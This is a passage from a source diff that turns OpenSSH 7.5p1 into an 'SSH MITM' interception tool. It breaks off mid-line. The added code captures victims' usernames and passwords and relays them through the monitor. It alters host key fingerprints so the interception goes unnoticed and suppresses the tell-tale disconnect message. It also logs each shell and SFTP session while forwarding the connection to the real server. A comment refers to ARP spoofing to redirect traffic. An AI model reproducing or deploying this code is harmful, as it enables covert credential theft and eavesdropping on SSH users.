 * minimum size we will look for.  This is a tradeoff between shell\n+   * responsiveness and completeness.  For interactive shell sessions,\n+   * responsiveness is much more important... */\n+  if (input_len < 8)\n+    return;\n+\n+  for (i = 0; i < 2; i++) {\n+    if (i == 0) {\n+      needle = c->legit_md5_fingerprint;\n+      needle_len = c->legit_md5_fingerprint_len;\n+    } else if (i == 1) {\n+      needle = c->legit_sha256_fingerprint;\n+      needle_len = c->legit_sha256_fingerprint_len;\n+    }\n+\n+    /* If we don't have a needle, don't bother to continue processing. */\n+    if (needle_len == 0)\n+      continue;\n+\n+    /* Begin by looking at the last 8 bytes of the input, and see if it matches\n+     * the first 8 bytes of the fingerprint.  Then look at the last/first 9\n+     * bytes, etc. */\n+    found_substr = 0;\n+    for (shift = 8; (shift < needle_len) && (shift <= input_len); shift++) {\n+      if (memcmp(input + (input_len - shift), needle, shift) == 0)\n+\tfound_substr = shift;\n+    }\n+\n+    /* If we find a match, move the matching characters to the extra_chars\n+     * array, and shorten the length of the output. */\n+    if (found_substr > 0) {\n+      c->extra_fp_bytes_len = found_substr;\n+      memcpy(c->extra_fp_bytes, input + input_len - found_substr, c->extra_fp_bytes_len);\n+      *output_len = input_len - found_substr;\n+    }\n+  }\n+}\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h\n--- openssh-7.5p1/channels.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/channels.h\t2019-09-08 01:47:49.746199615 +0000\n@@ -164,6 +164,22 @@\n \tvoid\t\t\t*mux_ctx;\n \tint\t\t\tmux_pause;\n \tint     \t\tmux_downstream_id;\n+\n+\tint log_fd;\t\t/* File handle for logging sessions. */\n+\tint is_sftp;            /* Set to 1 if this is an SFTP channel. */\n+\n+\t/* The MD5 & SHA256 fingerprints of the legit server's host keys, as\n+\t * well as the fingerprints for our host keys. */\n+\tchar *legit_md5_fingerprint;\n+\tunsigned int legit_md5_fingerprint_len;\n+\tchar *legit_sha256_fingerprint;\n+\tunsigned int legit_sha256_fingerprint_len;\n+\tchar *our_md5_fingerprint;\n+\tunsigned int our_md5_fingerprint_len;\n+\tchar *our_sha256_fingerprint;\n+\tunsigned int our_sha256_fingerprint_len;\n+\tchar *extra_fp_bytes;\n+\tunsigned int extra_fp_bytes_len;\n };\n \n #define CHAN_EXTENDED_IGNORE\t\t0\n@@ -214,7 +230,7 @@\n Channel\t*channel_by_remote_id(int);\n Channel\t*channel_lookup(int);\n Channel *channel_new(char *, int, int, int, int, u_int, u_int, int, char *, int);\n-void\t channel_set_fds(int, int, int, int, int, int, int, u_int);\n+void\t channel_set_fds(int, int, int, int, int, int, int, u_int, int, int);\n void\t channel_free(Channel *);\n void\t channel_free_all(void);\n void\t channel_stop_listening(void);\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c\n--- openssh-7.5p1/clientloop.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/clientloop.c\t2019-09-08 01:47:49.750199426 +0000\n@@ -1752,7 +1752,10 @@\n \tif (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {\n \t\tsnprintf(buf, sizeof buf,\n \t\t    \"Connection to %.64s closed.\\r\\n\", host);\n-\t\tbuffer_append(&stderr_buffer, buf, strlen(buf));\n+\t\t/* Suppress this message, otherwise the user will see our\n+\t\t * client make the same output as their own client (which would\n+\t\t * be a little weird/suspicious). */\n+\t\t/*buffer_append(&stderr_buffer, buf, strlen(buf));*/\n \t}\n \n \t/* Output any buffered data for stdout. */\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c\n--- openssh-7.5p1/loginrec.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/loginrec.c\t2019-09-08 01:47:49.750199426 +0000\n@@ -435,6 +435,8 @@\n int\n login_write(struct logininfo *li)\n {\n+        /* Since we never run as root, never attempt to record the log-in. */\n+        return (0);\n #ifndef HAVE_CYGWIN\n \tif (geteuid() != 0) {\n \t\tlogit(\"Attempt to write login records by non-root user (aborting)\");\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h\n--- openssh-7.5p1/lol.h\t1970-01-01 00:00:00.000000000 +0000\n+++ openssh-7.5p1-mitm/lol.h\t2019-09-08 23:26:17.143042221 +0000\n@@ -0,0 +1,62 @@\n+#ifndef LOL_H\n+#define LOL_H\n+\n+/* Current version of SSH MITM. */\n+#define SSH_MITM_VERSION \"v2.3-dev\"\n+\n+/* Define these in order to force connections to a test host.\n+ * Useful for quickly testing changes without needing to ARP \n+ * spoof; just connect to sshd's port directly. */\n+/*\n+#define DEBUG_HOST \"testhost\"\n+#define DEBUG_PORT 22\n+*/\n+\n+/* This is the user account that all incoming connections will authenticate\n+ * as (the provided user name is ignored). */\n+#define UNPRIVED_MITM_USER \"ssh-mitm\"\n+\n+/* The root path of SSH MITM (default: \"/home/ssh-mitm/\") */\n+#define MITM_ROOT \"/home/\" UNPRIVED_MITM_USER \"/\"\n+\n+/* The log path of SSH MITM (default: \"/home/ssh-mitm/log/\") */\n+#define MITM_LOG \"/home/\" UNPRIVED_MITM_USER \"/log/\"\n+\n+/* The path to the ssh client config. */\n+#define MITM_SSH_CLIENT_CONFIG MITM_ROOT \"etc/ssh_config\"\n+\n+/* The path to the modified ssh client. */\n+#define MITM_SSH_CLIENT MITM_ROOT \"bin/ssh\"\n+\n+/* The path to the client log file. The \"ssh\" and \"sftp\" clients' stderr\n+ * will go here. */\n+#define MITM_SSH_CLIENT_LOG MITM_LOG \"client.log\"\n+\n+/* This is the size of the buffer used to write the password and read host key\n+ * fingerprints to/from the client program. */\n+#define SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE 1024\n+\n+/* The size of the buffer used to store partial fingerprints intercepted. */\n+#define EXTRA_FP_BYTES_SIZE 64\n+\n+/* Uncomment this to open(2) log files with the O_SYNC flag.  Effectively, this\n+ * would cause logs to be written syncronously, though at the expense of lower\n+ * session responsiveness. */\n+/*#define SYNC_LOG 1*/\n+\n+struct _Lol {\n+  char *original_host;\n+  unsigned short original_port;\n+  char *username;\n+  char *password;\n+};\n+typedef struct _Lol Lol;\n+\n+#define MAX_SERVER_HOSTKEY_FPS 8\n+struct _hostkey_fp {\n+  char *old;\n+  char *new;\n+};\n+typedef struct _hostkey_fp hostkey_fp;\n+\n+#endif /* LOL_H */\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/Makefile.in openssh-7.5p1-mitm/Makefile.in\n--- openssh-7.5p1/Makefile.in\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/Makefile.in\t2019-09-08 01:47:49.754199237 +0000\n@@ -23,7 +23,7 @@\n VPATH=@srcdir@\n SSH_PROGRAM=@bindir@/ssh\n ASKPASS_PROGRAM=$(libexecdir)/ssh-askpass\n-SFTP_SERVER=$(libexecdir)/sftp-server\n+SFTP_SERVER=/home/ssh-mitm/bin/sftp-server\n SSH_KEYSIGN=$(libexecdir)/ssh-keysign\n SSH_PKCS11_HELPER=$(libexecdir)/ssh-pkcs11-helper\n PRIVSEP_PATH=@PRIVSEP_PATH@\n@@ -107,7 +107,7 @@\n \tmonitor.o monitor_wrap.o auth-krb5.o \\\n \tauth2-gss.o gss-serv.o gss-serv-krb5.o \\\n \tloginrec.o auth-pam.o auth-shadow.o auth-sia.o md5crypt.o \\\n-\tsftp-server.o sftp-common.o \\\n+\tsftp-server.o sftp-client.o sftp-common.o \\\n \tsandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \\\n \tsandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \\\n \tsandbox-solaris.o\n@@ -187,8 +187,8 @@\n ssh-keyscan$(EXEEXT): $(LIBCOMPAT) libssh.a ssh-keyscan.o\n \t$(LD) -o $@ ssh-keyscan.o $(LDFLAGS) -lssh -lopenbsd-compat -lssh $(LIBS)\n \n-sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-common.o sftp-server.o sftp-server-main.o\n-\t$(LD) -o $@ sftp-server.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)\n+sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-server.o sftp-server-main.o\n+\t$(LD) -o $@ sftp-server.o sftp-client.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)\n \n sftp$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-glob.o progressmeter.o\n \t$(LD) -o $@ progressmeter.o sftp.o sftp-client.o sftp-common.o sftp-glob.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS) $(LIBEDIT)\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c\n--- openssh-7.5p1/monitor.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/monitor.c\t2019-09-08 21:48:42.735461970 +0000\n@@ -119,6 +119,7 @@\n \n /* State exported from the child */\n static struct sshbuf *child_state;\n+static struct sshbuf *child_lol = NULL;\n \n /* Functions on the monitor that answer unprivileged requests */\n \n@@ -360,6 +361,7 @@\n \tssh_packet_set_log_preamble(ssh, \"user %s\", authctxt->user);\n \n \tmm_get_keystate(pmonitor);\n+\tmm_get_lol(pmonitor);\n \n \t/* Drain any buffered messages from the child */\n \twhile (pmonitor->m_log_recvfd != -1 && monitor_read_log(pmonitor) == 0)\n@@ -1613,6 +1615,31 @@\n \t}\n }\n \n+void\n+monitor_apply_lol(struct monitor *pmonitor, Lol *lol)\n+{\n+  u_int32_t original_port = 0;\n+  size_t username_len = 0, password_len = 0;\n+  u_char *username = NULL, *password = NULL;\n+\n+\n+  debug3(\"Applying lol...\");\n+\n+  if (child_lol == NULL)\n+    fatal(\"%s: child_lol is NULL!\", __func__);\n+\n+  if (sshbuf_get_u32(child_lol, &original_port) != 0 ||\n+      sshbuf_get_string(child_lol, &username, &username_len) != 0 ||\n+      sshbuf_get_string(child_lol, &password, &password_len) != 0)\n+    fatal(\"%s: sshbuf problems.\", __func__);\n+\n+  lol->original_port = (unsigned short)original_port;\n+  lol->username = username;\n+  lol->password = password;\n+  sshbuf_free(child_lol); child_lol = NULL;\n+  debug3(\"Done with lol...\");\n+}\n+\n /* This function requries careful sanity checking */\n \n void\n@@ -1627,6 +1654,16 @@\n \tdebug3(\"%s: GOT new keys\", __func__);\n }\n \n+void\n+mm_get_lol(struct monitor *pmonitor)\n+{\n+\tdebug3(\"%s: Waiting for lol\", __func__);\n+\tif ((child_lol = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tmm_request_receive_expect(pmonitor->m_sendfd, MONITOR_REQ_LOL, child_lol);\n+\tdebug3(\"%s: GOT lol\", __func__);\n+}\n+\n \n /* XXX */\n \ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h\n--- openssh-7.5p1/monitor.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/monitor.h\t2019-09-08 01:47:49.762198860 +0000\n@@ -56,6 +56,7 @@\n \tMONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,\n \tMONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,\n \tMONITOR_REQ_TERM = 50,\n+\tMONITOR_REQ_LOL = 52,\n \n \tMONITOR_REQ_PAM_START = 100,\n \tMONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c\n--- openssh-7.5p1/monitor_wrap.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/monitor_wrap.c\t2019-09-08 21:49:49.875161682 +0000\n@@ -482,6 +482,28 @@\n \tsshbuf_free(m);\n }\n \n+void\n+mm_send_lol(struct monitor *monitor, Lol *lol) {\n+\tstruct sshbuf *m;\n+\n+\tif ((m = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tif (lol == NULL)\n+\t\tfatal(\"%s: lol is NULL!\", __func__);\n+\n+\tdebug3(\"SENDING lol\");\n+\n+\tif (sshbuf_put_u32(m, lol->original_port) != 0 ||\n+\t    sshbuf_put_string(m, lol->username, strlen(lol->username)) != 0 ||\n+\t    sshbuf_put_string(m, lol->password, strlen(lol->password)) != 0) {\n+\t\tfatal(\"%s: can't pack lol!\", __func__);\n+\t}\n+\n+\tmm_request_send(monitor->m_recvfd, MONITOR_REQ_LOL, m);\n+\tdebug3(\"%s: Finished sending lol\", __func__);\n+\tsshbuf_free(m);\n+}\n+\n int\n mm_pty_allocate(int *ptyfd, int *ttyfd, char *namebuf, size_t namebuflen)\n {\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h\n--- openssh-7.5p1/monitor_wrap.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/monitor_wrap.h\t2019-09-08 01:47:49.762198860 +0000\n@@ -28,6 +28,8 @@\n #ifndef _MM_WRAP_H_\n #define _MM_WRAP_H_\n \n+#include \"lol.h\"\n+\n extern int use_privsep;\n #define PRIVSEP(x)\t(use_privsep ? mm_##x : x)\n \n@@ -84,8 +86,11 @@\n int mm_newkeys_to_blob(int, u_char **, u_int *);\n \n void monitor_apply_keystate(struct monitor *);\n+void monitor_apply_lol(struct monitor *, Lol *);\n void mm_get_keystate(struct monitor *);\n+void mm_get_lol(struct monitor *);\n void mm_send_keystate(struct monitor*);\n+void mm_send_lol(struct monitor *, Lol *);\n \n /* bsdauth */\n int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/openbsd-compat/bsd-misc.c openssh-7.5p1-mitm/openbsd-compat/bsd-misc.c\n--- openssh-7.5p1/openbsd-compat/bsd-misc.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/openbsd-compat/bsd-misc.c\t2019-09-08 01:47:49.762198860 +0000\n@@ -80,6 +80,7 @@\n #if !defined(HAVE_SETEUID) && defined(HAVE_SETREUID)\n int seteuid(uid_t euid)\n {\n+\treturn 0;\n \treturn (setreuid(-1, euid));\n }\n #endif /* !defined(HAVE_SETEUID) && defined(HAVE_SETREUID) */\n@@ -87,6 +88,7 @@\n #if !defined(HAVE_SETEGID) && defined(HAVE_SETRESGID)\n int setegid(uid_t egid)\n {\n+\treturn 0;\n \treturn(setresgid(-1, egid, -1));\n }\n #endif /* !defined(HAVE_SETEGID) && defined(HAVE_SETRESGID) */\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/openbsd-compat/bsd-setres_id.c openssh-7.5p1-mitm/openbsd-compat/bsd-setres_id.c\n--- openssh-7.5p1/openbsd-compat/bsd-setres_id.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/openbsd-compat/bsd-setres_id.c\t2019-09-08 01:47:49.762198860 +0000\n@@ -29,7 +29,7 @@\n setresgid(gid_t rgid, gid_t egid, gid_t sgid)\n {\n \tint ret = 0, saved_errno;\n-\n+\treturn 0;\n \tif (rgid != sgid) {\n \t\terrno = ENOSYS;\n \t\treturn -1;\n@@ -64,7 +64,7 @@\n setresuid(uid_t ruid, uid_t euid, uid_t suid)\n {\n \tint ret = 0, saved_errno;\n-\n+\treturn 0;\n \tif (ruid != suid) {\n \t\terrno = ENOSYS;\n \t\treturn -1;\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c\n--- openssh-7.5p1/session.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/session.c\t2019-09-08 01:47:49.762198860 +0000\n@@ -40,6 +40,10 @@\n #ifdef HAVE_SYS_STAT_H\n # include <sys/stat.h>\n #endif\n+#include <netinet/in.h>\n+#include <resolv.h>\n+#include <sys/file.h>\n+#include <time.h>\n #include <sys/socket.h>\n #include <sys/un.h>\n #include <sys/wait.h>\n@@ -94,6 +98,7 @@\n #include \"kex.h\"\n #include \"monitor_wrap.h\"\n #include \"sftp.h\"\n+#include \"digest.h\"\n \n #if defined(KRB5) && defined(USE_AFS)\n #include <kafs.h>\n@@ -116,16 +121,17 @@\n void\tsession_pty_cleanup(Session *);\n void\tsession_proctitle(Session *);\n int\tsession_setup_x11fwd(Session *);\n-int\tdo_exec_pty(Session *, const char *);\n-int\tdo_exec_no_pty(Session *, const char *);\n+int\tdo_exec_pty(Session *, const char *, char *);\n+int\tdo_exec_no_pty(Session *, const char *, char *);\n int\tdo_exec(Session *, const char *);\n void\tdo_login(Session *, const char *);\n #ifdef LOGIN_NEEDS_UTMPX\n static void\tdo_pre_login(Session *s);\n #endif\n-void\tdo_child(Session *, const char *);\n+void\tdo_child(Session *, const char *, char *);\n void\tdo_motd(void);\n int\tcheck_quietlogin(Session *, const char *);\n+double my_sleep(struct timespec *sleep_request);\n \n static void do_authenticated2(Authctxt *);\n \n@@ -140,6 +146,7 @@\n extern int startup_pipe;\n extern void destroy_sensitive_data(void);\n extern Buffer loginmsg;\n+extern Lol *lol;\n \n /* original command from peer. */\n const char *original_command = NULL;\n@@ -165,6 +172,14 @@\n static char *auth_sock_name = NULL;\n static char *auth_sock_dir = NULL;\n \n+/* This is the maximum number of times to attempt to open a log file for\n+ * writing. */\n+#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */\n+\n+char *create_password_and_fingerprint_socket(int *sock_fd);\n+void set_session_log(Session *s, unsigned int is_sftp, const char *command);\n+void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c);\n+\n /* removes the agent forwarding socket */\n \n static void\n@@ -291,7 +306,7 @@\n  * setting up file descriptors and such.\n  */\n int\n-do_exec_no_pty(Session *s, const char *command)\n+do_exec_no_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)\n {\n \tpid_t pid;\n \n@@ -343,6 +358,8 @@\n \n \tsession_proctitle(s);\n \n+\tset_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), command);\n+\n \t/* Fork the child. */\n \tswitch ((pid = fork())) {\n \tcase -1:\n@@ -420,7 +437,7 @@\n #endif\n \n \t\t/* Do processing for the child (exec command etc). */\n-\t\tdo_child(s, command);\n+\t\tdo_child(s, command, password_and_fingerprint_socket_name);\n \t\t/* NOTREACHED */\n \tdefault:\n \t\tbreak;\n@@ -475,7 +492,7 @@\n  * lastlog, and other such operations.\n  */\n int\n-do_exec_pty(Session *s, const char *command)\n+do_exec_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)\n {\n \tint fdout, ptyfd, ttyfd, ptymaster;\n \tpid_t pid;\n@@ -507,6 +524,8 @@\n \t\treturn -1;\n \t}\n \n+\tset_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), command);\n+\n \t/* Fork the child. */\n \tswitch ((pid = fork())) {\n \tcase -1:\n@@ -553,7 +572,7 @@\n \t\t * Do common processing for the child, such as execing\n \t\t * the command.\n \t\t */\n-\t\tdo_child(s, command);\n+\t\tdo_child(s, command, password_and_fingerprint_socket_name);\n \t\t/* NOTREACHED */\n \tdefault:\n \t\tbreak;\n@@ -619,6 +638,8 @@\n \tint ret;\n \tconst char *forced = NULL, *tty = NULL;\n \tchar session_type[1024];\n+\tint sock_fd = -1;\n+\tchar *password_and_fingerprint_socket_name = NULL;\n \n \tif (options.adm_forced_command) {\n \t\toriginal_command = command;\n@@ -673,10 +694,23 @@\n \t\tPRIVSEP(audit_run_command(shell));\n \t}\n #endif\n+\n+\t/* Create a socket for the ssh client program to output its host key\n+\t * fingerprints back to us. */\n+\tpassword_and_fingerprint_socket_name = create_password_and_fingerprint_socket(&sock_fd);\n+\tif (sock_fd < 0) {\n+\t  free(password_and_fingerprint_socket_name); password_and_fingerprint_socket_name = NULL;\n+\t  fatal(\"MITM: failed to create socket.\");\n+\t}\n+\n \tif (s->ttyfd != -1)\n-\t\tret = do_exec_pty(s, command);\n+\t\tret = do_exec_pty(s, command, password_and_fingerprint_socket_name);\n \telse\n-\t\tret = do_exec_no_pty(s, command);\n+\t\tret = do_exec_no_pty(s, command, password_and_fingerprint_socket_name);\n+\n+\t/* Write the password and read the client's host key fingerprints into\n+\t * the Channel struct. */\n+\twrite_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));\n \n \toriginal_command = NULL;\n \n@@ -1341,10 +1375,10 @@\n #else\n \t\tif (setlogin(pw->pw_name) < 0)\n \t\t\terror(\"setlogin failed: %s\", strerror(errno));\n-\t\tif (setgid(pw->pw_gid) < 0) {\n+\t\t/*if (setgid(pw->pw_gid) < 0) {\n \t\t\tperror(\"setgid\");\n \t\t\texit(1);\n-\t\t}\n+\t\t}*/\n \t\t/* Initialize the group list. */\n \t\tif (initgroups(pw->pw_name, pw->pw_gid) < 0) {\n \t\t\tperror(\"initgroups\");\n@@ -1416,6 +1450,8 @@\n #ifdef WITH_SELINUX\n \t\tsetexeccon(NULL);\n #endif\n+\t\tlogit(\"MITM: refusing to execute passwd.\");\n+\t\texit(1);\n #ifdef PASSWD_NEEDS_USERNAME\n \t\texecl(_PATH_PASSWD_PROG, \"passwd\", s->pw->pw_name,\n \t\t    (char *)NULL);\n@@ -1473,9 +1509,9 @@\n  * environment, closing extra file descriptors, setting the user and group\n  * ids, and executing the command or shell.\n  */\n-#define ARGV_MAX 10\n+#define ARGV_MAX 16\n void\n-do_child(Session *s, const char *command)\n+do_child(Session *s, const char *command, char *password_and_fingerprint_socket_name)\n {\n \textern char **environ;\n \tchar **env;\n@@ -1553,6 +1589,7 @@\n \t * ssh_remote_ipaddr there.\n \t */\n \tchild_close_fds();\n+\ts->session_log_fd = -1;\n \n \t/*\n \t * Must take new environment into use so that .ssh/rc,\n@@ -1612,11 +1649,22 @@\n \t\tprintf(\"This service allows sftp connections only.\\n\");\n \t\tfflush(NULL);\n \t\texit(1);\n-\t} else if (s->is_subsystem == SUBSYSTEM_INT_SFTP) {\n+\t} else if ((s->is_subsystem == SUBSYSTEM_INT_SFTP) ||\n+\t\t   ((command != NULL) && (memmem(command, strlen(command), \"sftp-server\", 11) != NULL))) {\n \t\textern int optind, optreset;\n \t\tint i;\n \t\tchar *p, *args;\n \n+\t\t/* Hard-code the SFTP server path to our version. */\n+\t\tif (command != NULL) {\n+\t\t  command = _PATH_SFTP_SERVER;\n+\n+\t\t  /* If DEBUG3 is enabled in sshd, spawn sftp-server with it\n+\t\t   * as well. */\n+\t\t  if (options.log_level == SYSLOG_LEVEL_DEBUG3)\n+\t\t    command = _PATH_SFTP_SERVER \" -f AUTH -l DEBUG3\";\n+\t\t}\n+\n \t\tsetproctitle(\"%s@%s\", s->pw->pw_name, INTERNAL_SFTP_NAME);\n \t\targs = xstrdup(command ? command : \"sftp-server\");\n \t\tfor (i = 0, (p = strtok(args, \" \")); p; (p = strtok(NULL, \" \")))\n@@ -1628,7 +1676,14 @@\n #ifdef WITH_SELINUX\n \t\tssh_selinux_change_context(\"sftpd_t\");\n #endif\n-\t\texit(sftp_server_main(i, argv, s->pw));\n+\t\tdebug3(\"MITM: SFTP server PID: %u\", getpid());\n+\t\texit(sftp_server_main(i, argv, s->pw,\n+#ifdef DEBUG_HOST\n+\t\t\t\t\tDEBUG_HOST, DEBUG_PORT,\n+#else\n+\t\t\t\t\tlol->original_host, lol->original_port,\n+#endif\n+\t\t\t\t\tlol->username, password_and_fingerprint_socket_name, s->session_log_filepath, s->session_log_dir));\n \t}\n \n \tfflush(NULL);\n@@ -1644,8 +1699,13 @@\n \t * name to be passed in argv[0] is preceded by '-' to indicate that\n \t * this is a login shell.\n \t */\n-\tif (!command) {\n+\tif (1) {\n \t\tchar argv0[256];\n+\t\tchar connect_string[512];\n+\t\tchar port[16];\n+\n+\t\tmemset(connect_string, 0, sizeof(connect_string));\n+\t\tmemset(port, 0, sizeof(port));\n \n \t\t/* Start the shell.  Set initial character to '-'. */\n \t\targv0[0] = '-';\n@@ -1658,9 +1718,41 @@\n \t\t}\n \n \t\t/* Execute the shell. */\n-\t\targv[0] = argv0;\n+\t\t/*argv[0] = argv0;\n \t\targv[1] = NULL;\n-\t\texecve(shell, argv, env);\n+\t\texecve(shell, argv, env);*/\n+\n+\n+\t\tsnprintf(port, sizeof(port), \"%hu\", lol->original_port);\n+\n+\t\tstrlcpy(connect_string, lol->username, sizeof(connect_string));\n+\t\tstrlcat(connect_string, \"@\", sizeof(connect_string));\n+\n+\t\t#ifdef DEBUG_HOST\n+\t\tstrlcat(connect_string, DEBUG_HOST, sizeof(connect_string));\n+\t\tsnprintf(port, sizeof(port), \"%d\", DEBUG_PORT);\n+\t\t#else\n+\t\tstrlcat(connect_string, lol->original_host, sizeof(connect_string));\n+\t\t#endif\n+\n+\t\tdebug3(\"MITMing connection to %s:%s\", connect_string, port);\n+\n+\t\targv[0] = MITM_SSH_CLIENT;\n+\t\targv[1] = \"-E\";\n+\t\targv[2] = MITM_SSH_CLIENT_LOG;\n+\t\targv[3] = \"-F\";\n+\t\targv[4] = MITM_SSH_CLIENT_CONFIG;\n+\t\targv[5] = \"-Z\";\n+\t\targv[6] = password_and_fingerprint_socket_name;\n+\t\targv[7] = \"-p\";\n+\t\targv[8] = port;\n+\t\targv[9] = connect_string;\n+\t\tif (command) {\n+\t\t\targv[10] = (char *)command;\n+\t\t\targv[11] = NULL;\n+\t\t} else\n+\t\t\targv[10] = NULL;\n+\t\texecve(argv[0], argv, env);\n \n \t\t/* Executing the shell failed. */\n \t\tperror(shell);\n@@ -1674,8 +1766,11 @@\n \targv[1] = \"-c\";\n \targv[2] = (char *) command;\n \targv[3] = NULL;\n-\texecve(shell, argv, env);\n+\tlogit(\"MITM: attempt to execute command blocked: [%s -c %s]\", shell0, command);\n+\t/*\n+\texecve(shell, argv, env);\t\n \tperror(shell);\n+\t*/\n \texit(1);\n }\n \n@@ -1927,6 +2022,11 @@\n \tdebug2(\"subsystem request for %.100s by user %s\", s->subsys,\n \t    s->pw->pw_name);\n \n+\tif (strcmp(s->subsys, \"sftp\") != 0) {\n+\t\tlogit(\"MITM: subsystem request for something other than sftp (%.100s).  Rejecting...\", s->subsys);\n+\t\treturn 0;\n+        }\n+\n \tfor (i = 0; i < options.num_subsystems; i++) {\n \t\tif (strcmp(s->subsys, options.subsystem_name[i]) == 0) {\n \t\t\tprog = options.subsystem_command[i];\n@@ -1958,6 +2058,10 @@\n {\n \tint success;\n \n+\t/* Disable X11 requests. */\n+\tlogit(\"MITM: rejecting X11 request.\");\n+\treturn 0;\n+\n \tif (s->auth_proto != NULL || s->auth_data != NULL) {\n \t\terror(\"session_x11_req: session %d: \"\n \t\t    \"x11 forwarding already active\", s->self);\n@@ -2022,6 +2126,10 @@\n \tchar *name, *val;\n \tu_int name_len, val_len, i;\n \n+\t/* Disable env requests. */\n+\tlogit(\"MITM: rejecting env request.\");\n+\treturn 0;\n+\n \tname = packet_get_cstring(&name_len);\n \tval = packet_get_cstring(&val_len);\n \tpacket_check_eom();\n@@ -2056,6 +2164,11 @@\n {\n \tstatic int called = 0;\n \tpacket_check_eom();\n+\n+\t/* Disable auth agent requests. */\n+\tlogit(\"MITM: rejecting auth agent request.\");\n+\treturn 0;\n+\n \tif (no_agent_forwarding_flag || !options.allow_agent_forwarding) {\n \t\tdebug(\"session_auth_agent_req: no_agent_forwarding_flag\");\n \t\treturn 0;\n@@ -2124,7 +2237,7 @@\n \tchannel_set_fds(s->chanid,\n \t    fdout, fdin, fderr,\n \t    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,\n-\t    1, is_tty, 